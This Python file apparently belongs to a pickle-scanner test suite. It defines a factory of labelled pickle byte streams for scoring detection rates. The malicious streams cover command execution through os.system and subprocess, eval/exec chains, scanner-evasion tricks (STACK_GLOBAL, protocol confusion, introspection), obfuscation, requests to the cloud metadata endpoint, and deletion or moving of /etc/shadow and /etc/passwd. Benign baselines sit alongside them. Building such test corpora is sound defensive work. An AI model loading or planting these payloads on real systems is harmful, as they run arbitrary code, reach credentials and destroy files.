"""Adversarial pickle payload templates.

Pre-built malicious pickle streams targeting every known evasion
technique. Each payload produces a Payload object with proper
categorization so the scoring engine can track detection rates
by attack class.

Payload families:
  1.  Direct RCE (os.system, subprocess, eval, exec)
  2.  Introspection chains (__subclasses__ → __builtins__ → eval)
  3.  Code object injection (types.CodeType + FunctionType)
  4.  Obfuscation chains (base64, zlib, marshal wrapping)
  5.  copyreg extension abuse (EXT opcode bypass)
  6.  Nested deserialization (pickle-in-pickle)
  7.  YAML injection in string args
  8.  Network exfiltration (socket, urllib, requests)
  9.  File system destruction (shutil.rmtree, os.remove)
  10. SSTI-style injection in string payloads
  11. Symlink / path traversal via module paths
  12. FFI / ctypes native code loading
  13. Module execution (runpy, importlib)
  14. Signal / threading abuse
  15. STACK_GLOBAL protocol 4+ evasion
  16. Protocol downgrade evasion (protocol 0 text format)
  17. Chained multi-stage attacks
  18. Class hierarchy manipulation
  19. Weakref / atexit abuse
  20. Benign baselines (false-positive testing)
"""

from __future__ import annotations

import struct

from ..base import Payload, PayloadCategory


class PicklePayloadFactory:
    """Factory producing categorized adversarial pickle payloads.

    Each method returns a Payload with:
      - Valid pickle bytecode (will parse without crash)
      - Correct categorization for scoring
      - Expected severity for self-test validation

    Total: 45+ payloads covering 12+ attack categories.
    """

    @classmethod
    def all_payloads(cls) -> list[Payload]:
        """Return every adversarial + benign payload."""
        return [
            # === Direct RCE ===
            cls.os_system_rce(),
            cls.subprocess_popen_rce(),
            cls.subprocess_call_rce(),
            cls.subprocess_check_output_rce(),
            cls.builtins_eval_rce(),
            cls.builtins_exec_rce(),
            cls.builtins_import_rce(),
            cls.os_popen_rce(),
            cls.os_execve_rce(),

            # === Introspection Chains ===
            cls.introspection_chain(),
            cls.introspection_subclasses_walk(),
            cls.getattr_chain(),

            # === Code Object Injection ===
            cls.codetype_injection(),
            cls.compile_exec(),

            # === Obfuscation ===
            cls.marshal_loads_obfuscation(),
            cls.base64_obfuscation(),
            cls.zlib_obfuscation(),
            cls.codecs_decode_obfuscation(),
            cls.double_base64(),

            # === copyreg / EXT Abuse ===
            cls.copyreg_ext_abuse(),
            cls.copyreg_dispatch_abuse(),

            # === Nested Deserialization ===
            cls.nested_pickle(),
            cls.nested_pickle_protocol4(),

            # === YAML Injection ===
            cls.yaml_injection(),

            # === Network Exfiltration ===
            cls.socket_exfiltration(),
            cls.urllib_ssrf(),
            cls.requests_ssrf(),
            cls.http_client_ssrf(),

            # === File System Destruction ===
            cls.shutil_rmtree_destruction(),
            cls.os_remove_destruction(),
            cls.os_rename_payload(),
            cls.pathlib_unlink(),

            # === SSTI ===
            cls.ssti_jinja2(),

            # === FFI / ctypes ===
            cls.ctypes_ffi(),
            cls.ctypes_pythonapi(),

            # === Module Execution ===
            cls.runpy_execution(),
            cls.importlib_import(),

            # === Signal / Threading ===
            cls.signal_abuse(),
            cls.threading_abuse(),

            # === STACK_GLOBAL (Protocol 4+) ===
            cls.stack_global_rce(),
            cls.stack_global_eval(),
            cls.stack_global_import(),

            # === Protocol Evasion ===
            cls.protocol0_text_rce(),
            cls.mixed_protocol_rce(),

            # === Multi-Stage Chains ===
            cls.multi_stage_import_getattr(),
            cls.reduce_chain(),

            # === Class Manipulation ===
            cls.atexit_register(),
            cls.weakref_callback(),

            # === Benign Baselines ===
            cls.benign_dict(),
            cls.benign_list(),
            cls.benign_nested_structure(),
            cls.benign_numpy_like(),
            cls.benign_collections(),
            cls.benign_datetime(),
            cls.benign_empty_pickle(),
            cls.benign_large_string(),
            cls.benign_deep_nested(),
        ]

    @classmethod
    def malicious_payloads(cls) -> list[Payload]:
        """Return only malicious payloads."""
        return [p for p in cls.all_payloads() if p.is_malicious]

    @classmethod
    def benign_payloads(cls) -> list[Payload]:
        """Return only benign payloads."""
        return [p for p in cls.all_payloads() if not p.is_malicious]

    # ── Direct RCE ───────────────────────────────────────────────

    @staticmethod
    def os_system_rce() -> Payload:
        data = b"\x80\x02cos\nsystem\n(S'id'\ntR."
        return Payload(
            name="os_system_rce",
            category=PayloadCategory.RCE,
            data=data,
            description="os.system('id') via GLOBAL+REDUCE",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-002"],
        )

    @staticmethod
    def subprocess_popen_rce() -> Payload:
        data = b"\x80\x02csubprocess\nPopen\n(](S'/bin/sh'\naS'-c'\naS'id'\natR."
        return Payload(
            name="subprocess_popen_rce",
            category=PayloadCategory.RCE,
            data=data,
            description="subprocess.Popen(['/bin/sh','-c','id'])",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-003"],
        )

    @staticmethod
    def subprocess_call_rce() -> Payload:
        data = b"\x80\x02csubprocess\ncall\n(](S'id'\natR."
        return Payload(
            name="subprocess_call_rce",
            category=PayloadCategory.RCE,
            data=data,
            description="subprocess.call(['id'])",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-003"],
        )

    @staticmethod
    def subprocess_check_output_rce() -> Payload:
        data = b"\x80\x02csubprocess\ncheck_output\n(](S'id'\natR."
        return Payload(
            name="subprocess_check_output_rce",
            category=PayloadCategory.RCE,
            data=data,
            description="subprocess.check_output(['id'])",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-003"],
        )

    @staticmethod
    def builtins_eval_rce() -> Payload:
        data = b"\x80\x02cbuiltins\neval\n(S'__import__(\"os\").system(\"id\")'\ntR."
        return Payload(
            name="builtins_eval_rce",
            category=PayloadCategory.CODE_INJECTION,
            data=data,
            description="builtins.eval() with nested os.system",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-001"],
        )

    @staticmethod
    def builtins_exec_rce() -> Payload:
        data = b"\x80\x02cbuiltins\nexec\n(S'import os; os.system(\"id\")'\ntR."
        return Payload(
            name="builtins_exec_rce",
            category=PayloadCategory.CODE_INJECTION,
            data=data,
            description="builtins.exec() with multi-statement payload",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-001"],
        )

    @staticmethod
    def builtins_import_rce() -> Payload:
        data = (
            b"\x80\x02cbuiltins\n__import__\n(S'os'\ntR"
            b"p0\ncbuiltins\ngetattr\n(g0\nS'system'\ntR"
            b"(S'id'\ntR."
        )
        return Payload(
            name="builtins_import_chain",
            category=PayloadCategory.RCE,
            data=data,
            description="__import__('os') → getattr → system chain",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-001"],
        )

    @staticmethod
    def os_popen_rce() -> Payload:
        data = b"\x80\x02cos\npopen\n(S'id'\ntR."
        return Payload(
            name="os_popen_rce",
            category=PayloadCategory.RCE,
            data=data,
            description="os.popen('id') — shell command with output capture",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-002"],
        )

    @staticmethod
    def os_execve_rce() -> Payload:
        data = b"\x80\x02cos\nexecve\n(S'/bin/sh'\n](S'-c'\naS'id'\na}tR."
        return Payload(
            name="os_execve_rce",
            category=PayloadCategory.RCE,
            data=data,
            description="os.execve('/bin/sh', ['-c', 'id'], {}) — process replacement",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-002"],
        )

    # ── Introspection Chains ─────────────────────────────────────

    @staticmethod
    def introspection_chain() -> Payload:
        data = (
            b"\x80\x02cbuiltins\ngetattr\n"
            b"(cbuiltins\nobject\nS'__subclasses__'\ntR"
            b")R."
        )
        return Payload(
            name="introspection_subclasses",
            category=PayloadCategory.EVASION,
            data=data,
            description="__subclasses__ introspection chain to bypass module blocklist",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-019"],
        )

    @staticmethod
    def introspection_subclasses_walk() -> Payload:
        data = (
            b"\x80\x02cbuiltins\ngetattr\n"
            b"(cbuiltins\ngetattr\n"
            b"(cbuiltins\ngetattr\n"
            b"(cbuiltins\ntuple\nS'__class__'\ntR"
            b"S'__bases__'\ntR"
            b"S'__subclasses__'\ntR"
            b")R."
        )
        return Payload(
            name="introspection_walk",
            category=PayloadCategory.EVASION,
            data=data,
            description="tuple.__class__.__bases__.__subclasses__() walk",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-019"],
        )

    @staticmethod
    def getattr_chain() -> Payload:
        data = (
            b"\x80\x02cbuiltins\ngetattr\n"
            b"(cbuiltins\ngetattr\n"
            b"(cbuiltins\n__import__\n(S'os'\ntR"
            b"S'system'\ntR"
            b"(S'id'\ntR."
        )
        return Payload(
            name="getattr_double_indirect",
            category=PayloadCategory.EVASION,
            data=data,
            description="Double getattr indirection to reach os.system",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-019"],
        )

    # ── Code Object Injection ────────────────────────────────────

    @staticmethod
    def codetype_injection() -> Payload:
        data = (
            b"\x80\x02ctypes\nCodeType\n"
            b"(I0\nI0\nI0\nI0\nI0\n"
            b"S'\\x00'\nS'()'\nS'()'\n"
            b"S'()'\nS'test'\nS'test'\n"
            b"I0\nS''\ntR"
            b"ctypes\nFunctionType\n"
            b"(g0\ncbuiltins\nglobals\n)RtR)R."
        )
        return Payload(
            name="codetype_functiontype",
            category=PayloadCategory.CODE_INJECTION,
            data=data,
            description="types.CodeType + FunctionType to inject raw bytecode",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-020"],
        )

    @staticmethod
    def compile_exec() -> Payload:
        data = (
            b"\x80\x02cbuiltins\ncompile\n"
            b"(S'import os; os.system(\"id\")'\n"
            b"S'<payload>'\nS'exec'\ntR"
            b"p0\ncbuiltins\nexec\n(g0\ntR."
        )
        return Payload(
            name="compile_exec_chain",
            category=PayloadCategory.CODE_INJECTION,
            data=data,
            description="compile() + exec() chain — dynamic code compilation",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-020"],
        )

    # ── Obfuscation ──────────────────────────────────────────────

    @staticmethod
    def marshal_loads_obfuscation() -> Payload:
        data = b"\x80\x02cmarshal\nloads\n(S'fake_marshalled_code'\ntR."
        return Payload(
            name="marshal_loads_obfuscation",
            category=PayloadCategory.OBFUSCATION,
            data=data,
            description="marshal.loads() to hide deserialized code objects",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-014"],
        )

    @staticmethod
    def base64_obfuscation() -> Payload:
        data = b"\x80\x02cbase64\nb64decode\n(S'aW1wb3J0IG9z'\ntR."
        return Payload(
            name="base64_decode_obfuscation",
            category=PayloadCategory.OBFUSCATION,
            data=data,
            description="base64.b64decode to hide payload string",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-017"],
        )

    @staticmethod
    def zlib_obfuscation() -> Payload:
        data = b"\x80\x02czlib\ndecompress\n(S'compressed_payload'\ntR."
        return Payload(
            name="zlib_decompress_obfuscation",
            category=PayloadCategory.OBFUSCATION,
            data=data,
            description="zlib.decompress to hide payload bytes",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-017"],
        )

    @staticmethod
    def codecs_decode_obfuscation() -> Payload:
        data = b"\x80\x02c_codecs\ndecode\n(S'payload_data'\nS'rot_13'\ntR."
        return Payload(
            name="codecs_rot13_obfuscation",
            category=PayloadCategory.OBFUSCATION,
            data=data,
            description="_codecs.decode with rot_13 encoding — string obfuscation",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-017"],
        )

    @staticmethod
    def double_base64() -> Payload:
        data = (
            b"\x80\x02cbuiltins\nexec\n("
            b"cbase64\nb64decode\n(S'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik='\ntR"
            b"\ntR."
        )
        return Payload(
            name="double_base64_exec",
            category=PayloadCategory.OBFUSCATION,
            data=data,
            description="exec(base64.b64decode(...)) — double-wrapped obfuscation",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-017"],
        )

    # ── copyreg EXT Abuse ────────────────────────────────────────

    @staticmethod
    def copyreg_ext_abuse() -> Payload:
        data = (
            b"\x80\x02ccopyreg\nadd_extension\n"
            b"(S'os'\nS'system'\nI42\ntR"
            b"\x82\x2a."
        )
        return Payload(
            name="copyreg_ext_abuse",
            category=PayloadCategory.EVASION,
            data=data,
            description="copyreg.add_extension → EXT opcode bypass of GLOBAL scanning",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-092"],
        )

    @staticmethod
    def copyreg_dispatch_abuse() -> Payload:
        data = (
            b"\x80\x02ccopyreg\ndispatch_table\n"
            b"p0\ncbuiltins\ngetattr\n"
            b"(g0\nS'__setitem__'\ntR"
            b"(cbuiltins\nobject\ncos\nsystem\ntR."
        )
        return Payload(
            name="copyreg_dispatch_table",
            category=PayloadCategory.EVASION,
            data=data,
            description="copyreg.dispatch_table manipulation for reducer hijack",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-092"],
        )

    # ── Nested Deserialization ───────────────────────────────────

    @staticmethod
    def nested_pickle() -> Payload:
        inner = b"\x80\x02cos\nsystem\n(S'id'\ntR."
        inner_repr = repr(inner)[2:-1]
        data = (
            b"\x80\x02cpickle\nloads\n(S'" +
            inner_repr.encode() +
            b"'\ntR."
        )
        return Payload(
            name="nested_pickle_loads",
            category=PayloadCategory.DESERIALIZATION,
            data=data,
            description="pickle.loads() inside pickle — double deserialization",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-016", "ARTIFACT-025"],
        )

    @staticmethod
    def nested_pickle_protocol4() -> Payload:
        # Protocol 4 variant using STACK_GLOBAL
        data = (
            b"\x80\x04\x95\x30\x00\x00\x00\x00\x00\x00\x00"
            b"\x8c\x07_pickle"      # SHORT_BINUNICODE "_pickle"
            b"\x8c\x05loads"        # SHORT_BINUNICODE "loads"
            b"\x93"                  # STACK_GLOBAL
            b"\x8c\x14\x80\x02cos\nsystem\n(S'id'\ntR."
            b"\x85"                  # TUPLE1
            b"\x52"                  # REDUCE
            b"."                     # STOP
        )
        return Payload(
            name="nested_pickle_p4",
            category=PayloadCategory.DESERIALIZATION,
            data=data,
            description="STACK_GLOBAL(_pickle, loads) double deser — protocol 4",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-016"],
        )

    # ── YAML Injection ───────────────────────────────────────────

    @staticmethod
    def yaml_injection() -> Payload:
        yaml_payload = "!!python/object/apply:os.system [id]"
        data = (
            b"\x80\x02cyaml\nload\n(S'" +
            yaml_payload.encode() +
            b"'\ntR."
        )
        return Payload(
            name="yaml_object_apply",
            category=PayloadCategory.DESERIALIZATION,
            data=data,
            description="YAML !!python/object/apply inside pickle string arg",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-018"],
        )

    # ── Network Exfiltration ─────────────────────────────────────

    @staticmethod
    def socket_exfiltration() -> Payload:
        data = b"\x80\x02csocket\nsocket\n(I2\nI1\ntR."
        return Payload(
            name="socket_creation",
            category=PayloadCategory.DATA_EXFILTRATION,
            data=data,
            description="socket.socket(AF_INET, SOCK_STREAM) for network access",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-004"],
        )

    @staticmethod
    def urllib_ssrf() -> Payload:
        data = b"\x80\x02curllib.request\nurlopen\n(S'http://169.254.169.254/latest/meta-data/'\ntR."
        return Payload(
            name="urllib_ssrf",
            category=PayloadCategory.SSRF,
            data=data,
            description="urllib.request.urlopen targeting cloud metadata endpoint",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-004"],
        )

    @staticmethod
    def requests_ssrf() -> Payload:
        data = b"\x80\x02crequests\nget\n(S'http://169.254.169.254/'\ntR."
        return Payload(
            name="requests_ssrf",
            category=PayloadCategory.SSRF,
            data=data,
            description="requests.get targeting cloud metadata endpoint",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-004"],
        )

    @staticmethod
    def http_client_ssrf() -> Payload:
        data = b"\x80\x02chttp.client\nHTTPConnection\n(S'169.254.169.254'\ntR."
        return Payload(
            name="http_client_ssrf",
            category=PayloadCategory.SSRF,
            data=data,
            description="http.client.HTTPConnection to cloud metadata",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-004"],
        )

    # ── File System Destruction ──────────────────────────────────

    @staticmethod
    def shutil_rmtree_destruction() -> Payload:
        data = b"\x80\x02cshutil\nrmtree\n(S'/tmp/target'\ntR."
        return Payload(
            name="shutil_rmtree",
            category=PayloadCategory.COMMAND_INJECTION,
            data=data,
            description="shutil.rmtree('/tmp/target') — filesystem destruction",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-007"],
        )

    @staticmethod
    def os_remove_destruction() -> Payload:
        data = b"\x80\x02cos\nremove\n(S'/etc/important'\ntR."
        return Payload(
            name="os_remove",
            category=PayloadCategory.COMMAND_INJECTION,
            data=data,
            description="os.remove('/etc/important') — file deletion",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-002"],
        )

    @staticmethod
    def os_rename_payload() -> Payload:
        data = b"\x80\x02cos\nrename\n(S'/etc/passwd'\nS'/tmp/stolen'\ntR."
        return Payload(
            name="os_rename",
            category=PayloadCategory.COMMAND_INJECTION,
            data=data,
            description="os.rename('/etc/passwd', '/tmp/stolen') — file exfiltration",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-002"],
        )

    @staticmethod
    def pathlib_unlink() -> Payload:
        data = b"\x80\x02cpathlib\nPath\n(S'/etc/shadow'\ntRp0\ncbuiltins\ngetattr\n(g0\nS'unlink'\ntR)R."
        return Payload(
            name="pathlib_unlink",
            category=PayloadCategory.COMMAND_INJECTION,
            data=data,
            description="pathlib.Path('/etc/shadow').unlink() — file deletion via pathlib",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-007"],
        )

    # ── SSTI / Jinja2 ────────────────────────────────────────────

    @staticmethod
    def ssti_jinja2() -> Payload:
        ssti = "{{ config.__class__.__init__.__globals__['os'].system('id') }}"
        data = (
            b"\x80\x02cbuiltins\neval\n(S'" +
            ssti.encode() +
            b"'\ntR."
        )
        return Payload(
            name="ssti_jinja2_in_eval",
            category=PayloadCategory.SSTI,
            data=data,
            description="Jinja2 SSTI payload injected via builtins.eval string arg",
            severity_expected="CRITICAL",
            tags=["CWE-502", "CWE-1336", "ARTIFACT-001"],
        )

    # ── FFI / ctypes ─────────────────────────────────────────────

    @staticmethod
    def ctypes_ffi() -> Payload:
        data = b"\x80\x02cctypes\nCDLL\n(S'libc.so.6'\ntR."
        return Payload(
            name="ctypes_cdll",
            category=PayloadCategory.RCE,
            data=data,
            description="ctypes.CDLL('libc.so.6') — native code loading via FFI",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-008"],
        )

    @staticmethod
    def ctypes_pythonapi() -> Payload:
        data = b"\x80\x02cctypes\npythonapi\n."
        return Payload(
            name="ctypes_pythonapi",
            category=PayloadCategory.RCE,
            data=data,
            description="ctypes.pythonapi — direct Python C API access",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-008"],
        )

    # ── Module Execution ─────────────────────────────────────────

    @staticmethod
    def runpy_execution() -> Payload:
        data = b"\x80\x02crunpy\nrun_module\n(S'http.server'\ntR."
        return Payload(
            name="runpy_run_module",
            category=PayloadCategory.RCE,
            data=data,
            description="runpy.run_module('http.server') — arbitrary module execution",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-011"],
        )

    @staticmethod
    def importlib_import() -> Payload:
        data = b"\x80\x02cimportlib\nimport_module\n(S'os'\ntR."
        return Payload(
            name="importlib_import",
            category=PayloadCategory.RCE,
            data=data,
            description="importlib.import_module('os') — dynamic import bypass",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-011"],
        )

    # ── Signal / Threading ───────────────────────────────────────

    @staticmethod
    def signal_abuse() -> Payload:
        data = b"\x80\x02csignal\nalarm\n(I1\ntR."
        return Payload(
            name="signal_alarm",
            category=PayloadCategory.COMMAND_INJECTION,
            data=data,
            description="signal.alarm(1) — process signal manipulation",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-095"],
        )

    @staticmethod
    def threading_abuse() -> Payload:
        data = b"\x80\x02cthreading\nThread\n(}S'target'\ncos\nsystem\nsS'args'\n(S'id'\ntsdtR."
        return Payload(
            name="threading_with_target",
            category=PayloadCategory.RCE,
            data=data,
            description="threading.Thread(target=os.system, args=('id',))",
            severity_expected="HIGH",
            tags=["CWE-502", "ARTIFACT-023"],
        )

    # ── STACK_GLOBAL (Protocol 4+) ───────────────────────────────

    @staticmethod
    def stack_global_rce() -> Payload:
        data = (
            b"\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00"
            b"\x8c\x02os"        # SHORT_BINUNICODE "os"
            b"\x8c\x06system"    # SHORT_BINUNICODE "system"
            b"\x93"              # STACK_GLOBAL
            b"\x8c\x02id"       # SHORT_BINUNICODE "id" (argument)
            b"\x85"              # TUPLE1
            b"\x52"              # REDUCE
            b"."                 # STOP
        )
        return Payload(
            name="stack_global_os_system",
            category=PayloadCategory.RCE,
            data=data,
            description="STACK_GLOBAL(os, system) + REDUCE — protocol 4 evasion",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-002"],
        )

    @staticmethod
    def stack_global_eval() -> Payload:
        data = (
            b"\x80\x04\x95\x25\x00\x00\x00\x00\x00\x00\x00"
            b"\x8c\x08builtins"  # SHORT_BINUNICODE "builtins"
            b"\x8c\x04eval"     # SHORT_BINUNICODE "eval"
            b"\x93"              # STACK_GLOBAL
            b"\x8c\x04test"     # SHORT_BINUNICODE "test"
            b"\x85"              # TUPLE1
            b"\x52"              # REDUCE
            b"."                 # STOP
        )
        return Payload(
            name="stack_global_eval",
            category=PayloadCategory.CODE_INJECTION,
            data=data,
            description="STACK_GLOBAL(builtins, eval) — protocol 4 code injection",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-001"],
        )

    @staticmethod
    def stack_global_import() -> Payload:
        data = (
            b"\x80\x04\x95\x2a\x00\x00\x00\x00\x00\x00\x00"
            b"\x8c\x08builtins"      # SHORT_BINUNICODE "builtins"
            b"\x8c\x0a__import__"    # SHORT_BINUNICODE "__import__"
            b"\x93"                   # STACK_GLOBAL
            b"\x8c\x02os"            # SHORT_BINUNICODE "os"
            b"\x85"                   # TUPLE1
            b"\x52"                   # REDUCE
            b"."                      # STOP
        )
        return Payload(
            name="stack_global_import",
            category=PayloadCategory.RCE,
            data=data,
            description="STACK_GLOBAL(builtins, __import__) — protocol 4 import bypass",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-001"],
        )

    # ── Protocol Evasion ─────────────────────────────────────────

    @staticmethod
    def protocol0_text_rce() -> Payload:
        # Pure protocol 0 (no PROTO header) — some scanners skip these
        data = b"cos\nsystem\n(S'id'\ntR."
        return Payload(
            name="protocol0_text_rce",
            category=PayloadCategory.EVASION,
            data=data,
            description="Protocol 0 text-format RCE (no PROTO header) — scanner evasion",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-002"],
        )

    @staticmethod
    def mixed_protocol_rce() -> Payload:
        # PROTO says protocol 0, but uses protocol 4 opcodes
        data = (
            b"\x80\x00"              # PROTO(0) — lies about version
            b"\x8c\x02os"            # SHORT_BINUNICODE (protocol 4!)
            b"\x8c\x06system"
            b"\x93"                   # STACK_GLOBAL (protocol 4!)
            b"\x8c\x02id"
            b"\x85\x52."
        )
        return Payload(
            name="mixed_protocol_confusion",
            category=PayloadCategory.EVASION,
            data=data,
            description="PROTO(0) + protocol 4 opcodes — version confusion evasion",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-070"],
        )

    # ── Multi-Stage Chains ───────────────────────────────────────

    @staticmethod
    def multi_stage_import_getattr() -> Payload:
        data = (
            b"\x80\x02cbuiltins\n__import__\n(S'os'\ntR"
            b"p0\ncbuiltins\ngetattr\n(g0\nS'system'\ntR"
            b"p1\ng1\n(S'id'\ntR."
        )
        return Payload(
            name="multi_stage_chain",
            category=PayloadCategory.RCE,
            data=data,
            description="import→getattr→call multi-stage chain with memo",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-019"],
        )

    @staticmethod
    def reduce_chain() -> Payload:
        data = (
            b"\x80\x02cos\nsystem\n(S'echo stage1'\ntR"
            b"0cos\nsystem\n(S'echo stage2'\ntR."
        )
        return Payload(
            name="reduce_chain",
            category=PayloadCategory.RCE,
            data=data,
            description="Multiple REDUCE calls in sequence — chained execution",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-002"],
        )

    # ── Class Manipulation ───────────────────────────────────────

    @staticmethod
    def atexit_register() -> Payload:
        data = b"\x80\x02catexit\nregister\n(cos\nsystem\nS'id'\ntR."
        return Payload(
            name="atexit_register",
            category=PayloadCategory.RCE,
            data=data,
            description="atexit.register(os.system, 'id') — delayed execution at exit",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-023"],
        )

    @staticmethod
    def weakref_callback() -> Payload:
        data = (
            b"\x80\x02cweakref\nref\n"
            b"(cbuiltins\nobject\n)R"
            b"cos\nsystem\ntR."
        )
        return Payload(
            name="weakref_callback",
            category=PayloadCategory.RCE,
            data=data,
            description="weakref.ref(obj, os.system) — callback-based execution",
            severity_expected="CRITICAL",
            tags=["CWE-502", "ARTIFACT-023"],
        )

    # ── Benign Baselines ─────────────────────────────────────────

    @staticmethod
    def benign_dict() -> Payload:
        data = (
            b"\x80\x04\x95\x14\x00\x00\x00\x00\x00\x00\x00"
            b"\x7d"                      # EMPTY_DICT
            b"\x8c\x03key"              # SHORT_BINUNICODE "key"
            b"\x8c\x05value"            # SHORT_BINUNICODE "value"
            b"\x73"                      # SETITEM
            b"."                         # STOP
        )
        return Payload(
            name="benign_dict",
            category=PayloadCategory.BENIGN,
            data=data,
            description="Simple dict {'key': 'value'} — no dangerous imports",
            severity_expected="NONE",
        )

    @staticmethod
    def benign_list() -> Payload:
        data = (
            b"\x80\x04\x95\x0a\x00\x00\x00\x00\x00\x00\x00"
            b"\x5d"                      # EMPTY_LIST
            b"\x4b\x01"                 # BININT1(1)
            b"\x61"                      # APPEND
            b"\x4b\x02"                 # BININT1(2)
            b"\x61"                      # APPEND
            b"\x4b\x03"                 # BININT1(3)
            b"\x61"                      # APPEND
            b"."                         # STOP
        )
        return Payload(
            name="benign_list",
            category=PayloadCategory.BENIGN,
            data=data,
            description="Simple list [1, 2, 3] — no dangerous imports",
            severity_expected="NONE",
        )

    @staticmethod
    def benign_nested_structure() -> Payload:
        data = (
            b"\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00"
            b"\x7d"                      # EMPTY_DICT
            b"\x8c\x04data"             # SHORT_BINUNICODE "data"
            b"\x5d"                      # EMPTY_LIST
            b"\x88"                      # NEWTRUE
            b"\x61"                      # APPEND
            b"\x89"                      # NEWFALSE
            b"\x61"                      # APPEND
            b"\x4e"                      # NONE
            b"\x61"                      # APPEND
            b"\x73"                      # SETITEM
            b"."                         # STOP
        )
        return Payload(
            name="benign_nested",
            category=PayloadCategory.BENIGN,
            data=data,
            description="Nested structure {'data': [True, False, None]}",
            severity_expected="NONE",
        )

    @staticmethod
    def benign_numpy_like() -> Payload:
        data = b"\x80\x02ccollections\nOrderedDict\n)R."
        return Payload(
            name="benign_numpy_like",
            category=PayloadCategory.BENIGN,
            data=data,
            description="collections.OrderedDict() — safe ML-style reconstruction",
            severity_expected="NONE",
        )

    @staticmethod
    def benign_collections() -> Payload:
        data = b"\x80\x02ccopy_reg\n_reconstructor\n(cbuiltins\nobject\n)tR."
        return Payload(
            name="benign_copy_reg_reconstruct",
            category=PayloadCategory.BENIGN,
            data=data,
            description="copy_reg._reconstructor — standard object rebuild",
            severity_expected="NONE",
        )

    @staticmethod
    def benign_datetime() -> Payload:
        data = (
            b"\x80\x02cdatetime\ndatetime\n"
            b"(I2024\nI1\nI15\nI12\nI30\nI0\ntR."
        )
        return Payload(
            name="benign_datetime",
            category=PayloadCategory.BENIGN,
            data=data,
            description="datetime.datetime(2024,1,15,12,30,0) — safe reconstruction",
            severity_expected="NONE",
        )

    @staticmethod
    def benign_empty_pickle() -> Payload:
        data = b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00\x4e."
        return Payload(
            name="benign_empty",
            category=PayloadCategory.BENIGN,
            data=data,
            description="Minimal pickle — just NONE + STOP",
            severity_expected="NONE",
        )

    @staticmethod
    def benign_large_string() -> Payload:
        large_str = "A" * 1000
        encoded = large_str.encode("utf-8")
        data = (
            b"\x80\x04\x95" +
            struct.pack("<Q", len(encoded) + 5) +
            b"\x58" +
            struct.pack("<I", len(encoded)) +
            encoded +
            b"."
        )
        return Payload(
            name="benign_large_string",
            category=PayloadCategory.BENIGN,
            data=data,
            description="Large 1KB string — tests parser capacity without danger",
            severity_expected="NONE",
        )

    @staticmethod
    def benign_deep_nested() -> Payload:
        # Build nested list-in-list 10 levels deep
        data = bytearray(b"\x80\x04\x95\x30\x00\x00\x00\x00\x00\x00\x00")
        for _ in range(10):
            data.append(0x5D)  # EMPTY_LIST
        for _ in range(9):
            data.append(0x61)  # APPEND
        data.append(0x2E)      # STOP
        return Payload(
            name="benign_deep_nested",
            category=PayloadCategory.BENIGN,
            data=bytes(data),
            description="10-level nested empty lists — recursion test without danger",
            severity_expected="NONE",
        )
